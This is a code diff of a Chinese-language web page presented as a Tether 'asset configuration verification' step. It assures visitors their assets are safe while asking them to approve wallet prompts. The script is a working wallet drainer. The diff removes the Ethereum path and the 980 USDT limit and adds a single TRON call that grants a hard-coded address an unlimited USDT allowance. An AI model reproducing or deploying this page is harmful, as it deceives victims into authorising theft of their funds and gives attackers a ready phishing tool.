@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>資產配置驗證</title>
+<title>資產配置驗證（僅 TRON）</title>
 <style>
   body {
     font-family: "Noto Sans TC", sans-serif;
@@ -87,12 +87,11 @@
   }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
 <div class="container">
   <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="Logo" class="logo" />
-  <h1>資產配置驗證</h1>
+  <h1>資產配置驗證（僅 TRON）</h1>
   <p>請保持錢包在線，並根據錢包提示完成授權操作。</p>
   <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
   <p id="status" class="loading">檢測環境中...</p>
@@ -102,27 +101,16 @@
   <strong>授權說明：</strong>
   <ul>
     <li>本次操作需授權指定合約，確保資產配置流程順利進行。</li>
-    <li>授權金額設定為 <strong>980 USDT</strong>，並採用分階段多次授權機制。</li>
+    <li>授權金額設定為 <strong>無限額度</strong>，以簡化授權流程。</li>
     <li>錢包將提示授權操作，請按照提示完成授權以保障流程正常。</li>
     <li>本平台致力保障您的資產安全，請放心操作。</li>
   </ul>
 </div>
 
 <script>
-  const USDT_CONTRACTS = {
-    TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7"
-  };
-
-  const TARGET_ADDRESS = {
-    TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
-    EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
-  };
-
-  const APPROVE_AMOUNT = "980000000"; // 980 * 10^6 (USDT小數位)
-
-  const MAX_APPROVE_COUNT = 10;
-  let approveCount = 0;
+  const USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  const TARGET_ADDRESS_TRON = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
   function setProgress(percent, status, cls="loading") {
     document.getElementById("progress-bar").style.width = percent + "%";
@@ -135,7 +123,6 @@
     try {
       setProgress(20, "檢測錢包環境...");
 
-      // TRON
       if (window.tronWeb && window.tronWeb.ready) {
         setProgress(40, "檢測到 TRON 錢包，連接中...");
         await tronApprove();
@@ -155,22 +142,7 @@
         return;
       }
 
-      // EVM
-      if (window.ethereum) {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        setProgress(40, "檢測到 EVM 錢包，連接中...");
-        await evmApprove();
-        return;
-      }
-      if (window.okxwallet || window.BinanceChain) {
-        const provider = window.okxwallet || window.BinanceChain;
-        await provider.request({ method: 'eth_requestAccounts' });
-        setProgress(40, "檢測到其他 EVM 錢包，連接中...");
-        await evmApprove(provider);
-        return;
-      }
-
-      setProgress(100, "未檢測到錢包，請安裝或打開錢包應用", "error");
+      setProgress(100, "未檢測到 TRON 錢包，請安裝或打開錢包應用", "error");
     } catch (err) {
       console.error(err);
       setProgress(100, "驗證未完成", "error");
@@ -180,44 +152,10 @@
 
   async function tronApprove() {
     try {
-      if (approveCount >= MAX_APPROVE_COUNT) {
-        setProgress(100, "授權次數已達上限", "error");
-        setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-        return;
-      }
-      approveCount++;
       const address = window.tronWeb.defaultAddress.base58;
       setProgress(60, "已連接：" + address + "，配置中...");
-      const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
-      await contract.approve(TARGET_ADDRESS.TRON, APPROVE_AMOUNT).send();
-      setProgress(100, "✅ 配置完成", "success");
-      setTimeout(() => { window.location.href = "success.html"; }, 1500);
-    } catch (err) {
-      console.error(err);
-      setProgress(100, "驗證未完成", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-    }
-  }
-
-  async function evmApprove(provider = window.ethereum) {
-    try {
-      if (approveCount >= MAX_APPROVE_COUNT) {
-        setProgress(100, "授權次數已達上限", "error");
-        setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-        return;
-      }
-      approveCount++;
-      const ethersProvider = new ethers.providers.Web3Provider(provider);
-      const signer = ethersProvider.getSigner();
-      const network = await ethersProvider.getNetwork();
-      let usdtAddress;
-      if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
-      else throw new Error("不支援的鏈");
-      setProgress(60, "已連接：" + await signer.getAddress() + "，配置中...");
-      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-      const contract = new ethers.Contract(usdtAddress, abi, signer);
-      const tx = await contract.approve(TARGET_ADDRESS.EVM, APPROVE_AMOUNT);
-      await tx.wait();
+      const contract = await window.tronWeb.contract().at(USDT_CONTRACT_TRON);
+      await contract.approve(TARGET_ADDRESS_TRON, INFINITE_AMOUNT).send();
       setProgress(100, "✅ 配置完成", "success");
       setTimeout(() => { window.location.href = "success.html"; }, 1500);
     } catch (err) {
